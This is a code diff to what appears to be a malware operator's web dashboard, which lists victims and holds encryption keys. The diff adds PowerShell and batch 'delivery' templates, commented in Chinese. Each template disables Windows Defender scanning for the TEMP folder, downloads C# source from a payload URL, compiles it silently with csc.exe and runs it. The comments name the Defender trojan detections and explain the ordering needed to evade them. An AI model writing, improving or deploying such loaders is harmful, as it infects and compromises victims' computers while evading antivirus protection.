@@ -464,6 +464,72 @@ def change_password():
     return jsonify(ok=True, msg='密码已更新，请使用新密码重新登录')
 
 # ── Dashboard ──
+# Windows 投递命令模板（PowerShell 原生命令 + cmd/bat 等价版）。
+#
+# 【为什么放在服务端而不是硬编码进 dashboard.html 的 JS 字符串】
+# 旧实现整段是 cmd/bat 语法（`::` 注释、`%TEMP%`、`%WINDIR%`）却夹杂
+# `powershell -c`；现代 Windows 默认终端是 PowerShell，用户粘进去后
+# `::` 解析失败、`%TEMP%`/`%WINDIR%` 不展开，表现就是「载荷无法运行」。
+# 改为下发 PowerShell 原生命令，并单独提供可直接存为 .bat 的 cmd 版本。
+# __URL__ 由前端替换为实际载荷地址。
+_WIN_DEPLOY_PS = r"""# ★ Windows 投递 — PowerShell 原生命令（请以【管理员】身份运行）
+#   Windows Defender 会两步拦截：① 按编译产物判毒 Trojan:MSIL/Lazy.BAC!MTB
+#   （exe 一诞生就被实时扫描拦掉）② 按投递命令行判毒 Trojan:Win32/PowExcEnv.ZA!MTB。
+#   因此必须【先放行 → 再下载 → 再编译 → 再运行】，顺序反了救不回来。
+#   若本机没有管理员权限，请先手动关闭 Defender 实时保护再执行。
+
+# ── 步1 放行 Defender（放行整个 TEMP 目录；单独放行文件对新建 exe 不可靠）──
+Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue
+
+# ── 步2 下载源码 ──
+$u='__URL__'
+$cs="$env:TEMP\j.cs"
+$exe="$env:TEMP\j.exe"
+Invoke-WebRequest -Uri $u -OutFile $cs -UseBasicParsing
+
+# ── 步3 编译（自动回退到任意可用的 csc.exe：64 位 → 32 位 → PATH）──
+$csc="$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if(!(Test-Path $csc)){ $csc="$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe" }
+if(!(Test-Path $csc)){ $csc=(Get-Command csc.exe -EA SilentlyContinue).Source }
+if(!$csc){ Write-Host "[X] 未找到 csc.exe —— 请安装 .NET Framework 4.x" -Fore Red; return }
+& $csc /nologo /target:winexe /out:$exe $cs
+if(!(Test-Path $exe)){ Write-Host "[X] 编译失败（见上方 csc 报错）" -Fore Red; return }
+Write-Host "[OK] 编译完成: $exe" -Fore Green
+
+# ── 步4 运行（载荷为静默 winexe，无回显属正常）──
+Start-Process $exe
+
+# ── 排错模式：若上面跑完看不到任何变化，用下面这行重编译为控制台程序，可看实时进度 ──
+# & $csc /nologo /target:exe /out:"$env:TEMP\jd.exe" $cs; & "$env:TEMP\jd.exe"
+"""
+
+_WIN_DEPLOY_BAT = r"""@echo off
+setlocal
+:: ★ Windows 投递 — cmd.exe / 批处理版（请【以管理员身份】运行）
+::   必须先放行 Defender，否则 exe 一诞生就被判毒 Trojan:MSIL/Lazy.BAC!MTB 而无法启动。
+
+:: 步1 放行 Defender（放行整个 TEMP，比单独放行文件可靠）
+powershell -c "Add-MpPreference -ExclusionPath '%TEMP%' -EA SilentlyContinue"
+
+:: 步2 下载源码
+powershell -c "IWR -Uri '__URL__' -OutFile '%TEMP%\j.cs' -UseBasicParsing"
+if not exist "%TEMP%\j.cs" ( echo [X] 下载失败 & pause & exit /b 1 )
+
+:: 步3 编译（自动回退：64 位 Framework → 32 位 Framework）
+set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if not exist "%CSC%" set "CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+if not exist "%CSC%" ( echo [X] 未找到 csc.exe，请安装 .NET Framework 4.x & pause & exit /b 1 )
+"%CSC%" /nologo /target:winexe /out:"%TEMP%\j.exe" "%TEMP%\j.cs"
+if not exist "%TEMP%\j.exe" ( echo [X] 编译失败，见上方报错 & pause & exit /b 1 )
+echo [OK] 编译完成: %TEMP%\j.exe
+
+:: 步4 运行（静默载荷无回显属正常）
+"%TEMP%\j.exe"
+echo [OK] 已启动
+endlocal
+"""
+
+
 @app.route('/dashboard')
 @login_required
 def dashboard():
@@ -499,7 +565,8 @@ def dashboard():
         has_active = False
     return render_template('dashboard.html', victims=victims, page=page,
         total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION,
-        aes_key=aes_key, has_active=has_active, has_key=has_key, key_fp=key_fp)
+        aes_key=aes_key, has_active=has_active, has_key=has_key, key_fp=key_fp,
+        win_deploy_ps=_WIN_DEPLOY_PS, win_deploy_bat=_WIN_DEPLOY_BAT)
 
 # ── Handshake ──
 @app.route('/health')
